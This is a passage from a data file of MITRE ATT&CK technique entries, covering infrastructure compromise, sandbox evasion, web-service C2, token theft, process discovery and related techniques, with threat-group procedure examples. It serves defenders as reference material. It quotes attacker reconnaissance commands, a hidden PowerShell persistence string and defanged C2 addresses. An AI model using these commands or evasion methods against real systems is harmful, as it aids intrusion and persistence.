had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured. "", '[Epic] uses the <code>net use</code>, <code>net session</code>, and <code>netstat</code> commands to gather information on network connections.', '[Comnie] executes the <code>netstat -ano</code> command.', 'Once inside a Virtual Private Cloud, [Pacu] can attempt to identify DirectConnect, VPN, or VPC Peering.', '[Egregor] can enumerate all connected drives.', '[Mafalda] can use the <code>GetExtendedTcpTable</code> function to retrieve information about established TCP connections.', ""[Cuba] can use the function <code>GetIpNetTable</code> to recover the last connections to the victim's machine. "", '[NETWIRE] can capture session logon details from a compromised host.', '[OSInfo] enumerates the current network connections similar to <code> net use </code>.', '[Sykipot] may use <code>netstat -ano</code> to display active network connections.', '[PyDCrypt] has used [netsh] to find RPC connections on remote machines.', '[APT1] used the <code>net use</code> command to get a listing on network connections.', '[Waterbear] can use API hooks on `GetExtendedTcpTable` to retrieve a table containing a list of TCP endpoints available to the application. ', '[PlugX] has a module for enumerating TCP and UDP network connections and associated processes using the <code>netstat</code> command.', '[OilRig] has used <code>netstat -an</code> on a victim to get a listing of network connections.', '[ToddyCat] has used `netstat -anop tcp` to discover TCP connections to compromised hosts.', 'The discovery modules used with [Duqu] can collect information on network connections.', '[Magic Hound] has used quser.exe to identify existing RDP connections.', '[nbtstat] can be used to discover current NetBIOS sessions.', '[Chimera] has used <code>netstat -ano | findstr EST</code> to discover network connections.', '[MuddyWater] has used a PowerShell backdoor to check for Skype connections on the target machine.', '[SLOTHFULMEDIA] can enumerate open ports on a victim machine.', '[admin@338] actors used the following command following exploitation of a machine with [LOWBALL] malware to display network connections: <code>netstat -ano >> %temp%\\download</code>', '[GALLIUM] used <code>netstat -oan</code> to obtain information about the victim network connections.', '[CharmPower] can use `netsh wlan show profiles` to list specific Wi-Fi profile details.', '[SHOTPUT] uses [netstat] to list TCP connection status.', '[APT41] has enumerated IP addresses of network resources and used the <code>netstat</code> command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.', '[Conti] can enumerate routine network connections from a compromised host.', 'After loading the keyword and phone data files, [MESSAGETAP] begins monitoring all network connections to and from the victim server. ', 'During [Operation CuckooBees] the threat actors used the `net session`, `net use`, and `netstat` commands as part of their advanced reconnaissance.', '[Kwampirs] collects a list of active and listening connections by using the command <code>netstat -nao</code> as well as a list of available network mappings with <code>net use</code>.', '[Empire] can enumerate the current network connections of a host.', 'During [FunnyDream] the threat actors used [netstat] to discover network connections on remote systems.', '[KOPILUWAK] can use [netstat] [Arp] and [Net] to discover current TCP connections.', '[HEXANE] has used [netstat] to monitor connections to specific ports.', '[Sibot] has retrieved a GUID associated with a present LAN connection on a compromised machine.', '[SpeakUp] uses the <code>arp -a</code> command. ', '[APT5] has used the BLOODMINE utility to collect data on web requests from Pulse Secure Connect logs.', '[BackdoorDiplomacy] has used NetCat and PortQry  to enumerate network connections and display the status of related TCP and UDP ports.', '[Okrum] was seen using NetSess to discover NetBIOS sessions.', ""[APT32] used the <code>netstat -anpo tcp</code> command to display TCP connections on the victim's machine."", '[Earth Lusca] employed a PowerShell script called RDPConnectionParser to read and filter the Windows event log “Microsoft-Windows-TerminalServices-RDPClient/Operational” (Event ID 1024) to obtain network information from RDP connections. [Earth Lusca] has also used [netstat] from a compromised system to obtain network connection information.', '[Tropic Trooper] has tested if the localhost network is available and other connection capability on an infected system using command scripts.\t', '[POWRUNER] may collect active network connections by running <code>netstat -an</code> on a victim.', '[USBferry] can use <code>netstat</code> and <code>nbtstat</code> to detect active network connections.\t', '[Flagpro] has been used to execute <code>netstat -ano</code> on a compromised host.', '[QakBot] can use <code>netstat</code> to enumerate current network connections.', '[Ke3chang] performs local network connection discovery using <code>netstat</code>.', '[BADHATCH] can execute `netstat.exe -f` on a compromised machine.', '[Pupy] has a built-in utility command for <code>netstat</code>, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.', '[jRAT] can list network connections.', '[Ramsay] can use <code>netstat</code> to enumerate network connections.', '[RedLeaves] can enumerate drives and Remote Desktop sessions.', '[Volgmer] can gather information about TCP connection state.', '[Sardonic] has the ability to execute the `netstat` command.', '[Lazarus Group] has used <code>net use</code> to identify and establish a network connection with a remote host.', '[FIN13] has used `netstat` and other net  commands for network reconnaissance efforts.', '[Sliver] can collect network connection information.', '[Threat Group-3390] has used `net use` and `netstat` to conduct internal discovery of systems. The group has also used `quser.exe` to identify existing RDP sessions on a victim.', '[Aria-body] has the ability to gather TCP and UDP table status listings.', '[Lizar] has a plugin to retrieve information about all active network sessions on the infected server.', '[Operation Wocao] has collected a list of open connections on the infected system using netstat and checks whether it has an internet connection.']",False
T1584,Compromise Infrastructure,"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle. Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.  Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates] to further blend in and support staged information gathering and/or [Phishing] campaigns. Additionally, adversaries may also compromise infrastructure to support [Proxy] and/or proxyware services.  By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.",[],False
T1542,Pre-OS Boot,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.  Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",[],False
T1064,Scripting,"**This technique has been deprecated. Please use [Command and Scripting Interpreter] where appropriate.**  Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell] but could also be in the form of command-line batch scripts.  Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment] and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution] where adversaries will rely on macros being allowed or that the user will accept to activate them.  Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ","['[APT29] has used encoded PowerShell scripts uploaded to [CozyCar] installations to download and install [SeaDuke] as well as to evade defenses.', '[jRAT] has been distributed as HTA files with VBScript+JScript.', '[Orz] can execute commands with script as well as execute JavaScript.', '[MuddyWater] has used VBScript and JavaScript files to execute its [POWERSTATS] payload. [MuddyWater] has also used Microsoft scriptlets, macros, and PowerShell scripts.[', '[China Chopper] server component is a text based payload available in a variety of scripting languages.\t', '[MoonWind] uses batch scripts for various purposes, including to restart and uninstall itself.', '[Rancor] has used shell and VBS scripts as well as embedded macros for execution.', '[Cobalt Strike] can use [PowerShell] Python, VBA, [PowerSploit] other scripting frameworks to perform execution.', '[APT32] has used macros, PowerShell scripts, COM scriptlets, and VBS scripts.', '[OceanSalt] has been executed via malicious macros.', '[APT37] executes shellcode and a script to decode Base64 strings.', '[Proxysvc] uses a batch file to delete itself.', '[NavRAT] loads malicious shellcode and executes it in memory.', '[Zeus Panda] can launch remote scripts on the victim’s machine.', ""[FIN7] used SQL, VBS and JavaScript scripts to help perform tasks on the victim's machine."", 'A Destover-like variant used by [Lazarus Group] uses a batch file mechanism to delete its binaries from the system.', '[SeaDuke] uses a module to execute Mimikatz with PowerShell to perform [Pass the Ticket]', '[APT3] has used PowerShell on victim systems to download and run payloads after exploitation.', '[Deep Panda] has used PowerShell scripts to download and execute programs in memory, without writing to disk.', 'One version of [Helminth] consists of VBScript and PowerShell scripts. The malware also uses batch scripting.', 'To assist in establishing persistence, [RogueRobin] creates <code>%APPDATA%\\OneDrive.bat</code> and saves the following string to it:<code>powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\\OneDrive.ps1”</code>. [RogueRobin] also uses Windows Script Components.', '[Gallmaker] used PowerShell scripts for execution.', ""[Denis] executes shellcode on the victim's machine."", '[Patchwork] used Visual Basic Scripts (VBS), JavaScript code, batch files, and .SCT files on victim machines.', '[PowerStallion] uses [PowerShell] loops to iteratively check for available commands in its OneDrive C2 server.', '[Honeybee] embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened. The actors also used batch scripting.', ""[Revenge RAT] executes scripts on the victim's machine."", '[menuPass] has used malicious macros embedded inside Office documents to execute files.', 'Dragonfly used various scripts for execution, and was observed installing Python 2.7 on a victim.', 'APT34 has used .bat and .vbs scripts for execution.']",False
T1612,Build Image on Host,"Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.  An adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container] using that custom image. If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ",[],False
T1051,Shared Webroot,"**This technique has been deprecated and should no longer be used.**  Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory   and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.  This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. ",[],
T1586,Compromise Accounts,"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts] adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.   A variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information] purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.  Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.  Adversaries may directly leverage compromised email accounts for [Phishing for Information] or [Phishing]",[],False
T1497,Virtualization/Sandbox Evasion,"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion] during automated discovery to shape follow-on behaviors.  Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion] such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.  ","['[StoneDrill] has used several anti-emulation techniques to prevent automated analysis by emulators or sandboxes.\t', ' [Agent Tesla] has the ability to perform anti-sandboxing and anti-virtualization checks.', '[Bisonal] can check to determine if the compromised system is running on VMware.', '[Carberp] has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.', '[Black Basta] can make a random number of calls to the `kernel32.beep` function to hinder log analysis.', 'During [Operation Spalax] the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.', '[Bazar] can attempt to overload sandbox analysis by sending 1550 calls to <code>printf</code>.', '[Gelsemium] can use junk code to generate random activity to obscure malware behavior.', '[CHOPSTICK]  includes runtime checks to identify an analysis environment and prevent execution on it.', '[Metamorfo] has embedded a ""vmdetect.exe"" executable to identify virtual machines at the beginning of execution. ', '[Bumblebee] has the ability to perform anti-virtualization checks.', '[RTM] can detect if it is running within a sandbox or other virtualized analysis environment.\t', '[Darkhotel] malware has employed just-in-time decryption of strings to evade sandbox detection.', '[Egregor] has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes. ', 'Some versions of [CozyCar] will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.', '[Kevin] can sleep for a time interval between C2 communication attempts.', '[Pteranodon] has the ability to use anti-detection functions to identify sandbox environments.', '[Squirrelwaffle] has contained a hardcoded list of IP addresses to block that belong to sandboxes and analysis platforms.', '[Hancitor] has used a macro to check that an ActiveDocument shape object in the lure message is present. If this object is not found, the macro will exit without downloading additional payloads.', '[Lucifer] can crash a debugger by passing a format string to <code>OutputDebugStringA()</code>.', '[The White Company] has performed anti-analysis checks to determine if its malware was in a debugging environment.', '[HAWKBALL] has methods to check if the process the malware uses is being debugged.']",
T1102,Web Service,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.  Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","['During [C0027] [Scattered Spider] downloaded tools from sites including file.io, GitHub, and paste.ee.', '[Inception] has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.', '[Snip3] can download additional payloads from web services including Pastebin and top4top.', '[Carbon] can use Pastebin to receive C2 commands.', '[Rocke] has used Pastebin, Gitee, and GitLab for Command and Control.', '[BoomBox] can download files from Dropbox using a hardcoded access token.', '[SharpStage] has used a legitimate web service for evading detection. ', 'During [Operation Spalax] the threat actors used OneDrive and MediaFire to host payloads.', '[FIN6] has used Pastebin and Google Storage to host content for their operations.\t ', '[SMOKEDHAM] has used Google Drive and Dropbox to host files downloaded by victims via malicious links.', '[LazyScripter] has used GitHub to host its payloads to operate spam campaigns. ', '[DropBook] can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions.', ""[Bumblebee] has been downloaded to victim's machines from OneDrive."", '[FIN8] has used <code>sslip.io</code>, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.', '[Hildegard] has downloaded scripts from GitHub.', '[EXOTIC LILY] has used file-sharing services including WeTransfer, TransferNow, and OneDrive to deliver payloads.', '[BADHATCH] can be utilized to abuse `sslip.io`, a free IP to domain mapping service, as part of actor-controlled C2 channels.', ""[Sibot] has used a legitimate compromised website to download DLLs to the victim's machine."", ""[Ember Bear] has used Discord's content delivery network (CDN) to deliver malware and malicious scripts to a compromised host."", '[NETWIRE] has used web services including Paste.ee to host payloads.', '[CharmPower] can download additional modules from actor-controlled Amazon S3 buckets.', '[WhisperGate] can download additional payloads hosted on a Discord channel.', '[ngrok] has been used by threat actors to proxy C2 connections to ngrok service subdomains.', '[DarkTortilla] can retrieve its primary payload from public sites such as Pastebin and Textbin.', '[Doki] has used the dogechain.info API to generate a C2 address.', '[Brute Ratel C4] can use legitimate websites for external C2 channels including Slack, Discord, and MS Teams.', '[GuLoader] has the ability to download malware from Google Drive.', '[Fox Kitten] has used Amazon Web Services to host C2.', '[Bazar] downloads have been hosted on Google Docs.', '[Turla] has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.', '[Mustang Panda] has used DropBox URLs to deliver variants of [PlugX]', '[SocGholish] has used Amazon Web Services to host second-stage servers.', ""[Gamaredon Group] has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.\t"", '[APT32] has used Dropbox, Amazon S3, and Google Drive to host malicious downloads.', 'During [C0017] [APT41] used the Cloudflare services for C2 communications.', '[TeamTNT] has leveraged iplogger.org to send collected data back to C2.', '[Ngrok] has been used by threat actors to proxy C2 connections to ngrok service subdomains.', ""[Chimera] has used Google Cloud's appspot service to host C2 servers.""]",
T1608,Stage Capabilities,"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities] or obtained ([Obtain Capabilities] and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure] or was otherwise compromised by them ([Compromise Infrastructure] Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.  Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):  * Staging web resources necessary to conduct [Drive-by Compromise] when a user browses to a site. * Staging web resources for a link target to be used with spearphishing. * Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer] * Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography] with [Web Protocols]",['[Mustang Panda] has used servers under their control to validate tracking pixels sent to phishing victims.'],False
T1104,Multi-Stage Channels,"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.  Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.  The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels] in case the original first-stage communication path is discovered and blocked.","['An [APT3] downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.', '[BLACKCOFFEE] uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.', '[Lazarus Group] has used multi-stage malware components that inject later stages into separate processes.', '[Valak] can download additional modules and malware capable of using separate C2 channels.', 'The [Bazar] loader is used to download and execute the [Bazar] backdoor.', '[Snip3] can download and execute additional payloads and modules over separate communication channels.', 'Individual [Uroburos] implants can use multiple communication channels based on one of four available modes of operation.', '[MuddyWater] has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back. ', '[BACKSPACE] attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs ""louder"" interactions with the malware.', 'After initial compromise, [Chaos] will download a second stage to establish a more permanent presence on the affected system.', '[APT41] used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.', 'After initial compromise, [Chaos] will download a second stage to establish a more permanent presence on the affected system.']",
T1657,Financial Theft,"Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware, business email compromise (BEC) and fraud, ""pig butchering,"" bank hacking, and exploiting cryptocurrency networks.   Adversaries may [Compromise Accounts] to conduct unauthorized transfers of funds. In the case of business email compromise or email fraud, an adversary may utilize [Impersonation] of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary. This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.  Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact]  and [Exfiltration] of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary. Adversaries may use dedicated leak sites to distribute victim data.  Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction] and business disruption.","['[Cinnamon Tempest] has maintained leak sites for exfiltrated data in attempt to extort victims into paying a ransom.', '[Malteiro] targets organizations in a wide variety of sectors via the use of [Mispadu] banking trojan with the goal of financial theft.', ""[FIN13] has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions."", '[Akira] engages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom.', '[Scattered Spider] has deployed ransomware on compromised hosts for financial gain.', '[DarkGate] can deploy payloads capable of capturing credentials related to cryptocurrency wallets.', '[SilverTerrier] targets organizations in high technology, higher education, and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft.']",False
T1480,Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.  Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion] While use of [Virtualization/Sandbox Evasion] may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.","[""[DEADEYE] can ensure it executes only on intended systems by identifying the victim's volume serial number, hostname, and/or DNS domain."", '[Anchor] can terminate itself if specific execution flags are not present.', '[BitPaymer] compares file names and paths to a list of excluded names and directory names during encryption.', '[DarkGate] uses per-victim links for hosting malicious archives, such as ZIP files, in services such as SharePoint to prevent other entities from retrieving them.', '[VaporRage] has the ability to check for the presence of a specific DLL and terminate if it is not found.', '[EnvyScout] can call <code>window.location.pathname</code> to ensure that embedded files are being executed from the C: drive, and will terminate if they are not.', ""[Torisma] is only delivered to a compromised host if the victim's IP address is on an allow-list."", '[Small Sieve] can only execute correctly if the word `Platypus` is passed to it on the command line.', '[Stuxnet] checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met.', '[SUNSPOT] only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values. ', '[BoomBox] can check its current working directory and for the presence of a specific file and terminate if specific values are not found.', ""[NativeZone] can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components."", '[APT33] has used kill dates in their malware to guardrail execution.']",False
T1619,Cloud Storage Object Discovery,"Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery] on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery] adversaries may access the contents/objects stored in cloud infrastructure.  Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS  and List Blobs in Azure .","['[Pacu] can enumerate AWS storage services, such as S3 buckets and Elastic Block Store volumes.', '[Peirates] can list AWS S3 buckets.']",False
T1654,Log Enumeration,"Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery] security or vulnerable software ([Software Discovery] or hosts within a compromised network ([Remote System Discovery]  Host binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell] on Windows to access and/or export security event information. In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.  Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.","['[APT5] has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs.', '[Volt Typhoon] has used `wevtutil.exe` and the PowerShell command `Get-EventLog security` to enumerate Windows logs to search for successful logons.', '[Pacu] can collect CloudTrail event histories and CloudWatch logs.']",False
T1528,Steal Application Access Token,"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.  Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.  For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container’s token and thereby gain access to Kubernetes API commands.  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment. If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.  Token theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow. An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.    Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls. Then, they can send a [Spearphishing Link] to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token]  Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens, allowing them to obtain new access tokens without prompting the user.    ","['[APT29] uses stolen tokens to access victim accounts, without needing a password.', '[Peirates] gathers Kubernetes service account tokens using a variety of techniques.', '[AADInternals] can steal users’ access tokens via phishing emails containing malicious links.', '[APT28] has used several malicious applications to steal user OAuth access tokens including applications masquerading as ""Google Defender"" ""Google Email Protection,"" and ""Google Scanner"" for Gmail users. They also targeted Yahoo users with applications masquerading as ""Delivery Service"" and ""McAfee Email Protection"".']",False
T1204,User Execution,"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing]  While [User Execution] frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing]  Adversaries may also deceive users into performing actions such as enabling [Remote Access Software] allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie] or downloading and executing malware for [User Execution]  For example, tech support scams can be facilitated through [Phishing] vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software]","['[Scattered Spider] has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access.', '[LAPSUS$] has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing [LAPSUS$] to take control of an authenticated system.', '[Magic Hound] has attempted to get users to execute malware via social media and spearphishing emails.']",False
T1196,Control Panel Items,"Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function.   Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.     For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.   Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment] campaigns   or executed as part of multi-stage malware.  Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.",[],True
T1057,Process Discovery,"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  In Windows environments, adversaries could obtain details on running processes using the [Tasklist] utility via [cmd] or <code>Get-Process</code> via [PowerShell] Information about processes can also be extracted from the output of [Native API] calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`.   On network devices, [Network Device CLI] commands such as `show processes` can be used to display current running processes.","['[Epic] uses the <code>tasklist /v</code> command to obtain a list of processes.', '[WarzoneRAT] can obtain a list of processes on a compromised host.', '[FELIXROOT] collects a list of running processes.', 'During [Frankenstein] the threat actors used [Empire] to obtain a list of all running processes.', '[Windshift] has used malware to enumerate active processes.', '[SUNSPOT] monitored running processes for instances of <code>MsBuild.exe</code> by hashing the name of each running process and comparing it to the corresponding value <code>0x53D525</code>. It also extracted command-line arguments and individual arguments from the running <code>MsBuild.exe</code> process to identify the directory path of the Orion software Visual Studio solution.', '[StreamEx] has the ability to enumerate processes.', '[Aria-body] has the ability to enumerate loaded modules for a process..', '[Volt Typhoon] has enumerated running processes on targeted systems.', '[MoonWind] has a command to return a list of running processes.', '[Zebrocy] uses the <code>tasklist</code> and <code>wmic process get Capture, ExecutablePath</code> commands to gather the processes running on the system.', '[IronNetInjector] can identify processes via C# methods such as <code>GetProcessesByName</code> and running [Tasklist] with the Python <code>os.popen</code> function.', '[FruitFly] has the ability to list processes on the system.', '[Cannon] can obtain a list of processes running on the system.', '[LoudMiner] used the <code>ps</code> command to monitor the running processes on the system.\t', '[WinMM] sets a WH_CBT Windows hook to collect information on process creation.', '[ZxxZ] has created a snapshot of running processes using `CreateToolhelp32Snapshot`.', '[Grandoreiro] can identify installed security tools based on process names.', '[KEYMARBLE] can obtain a list 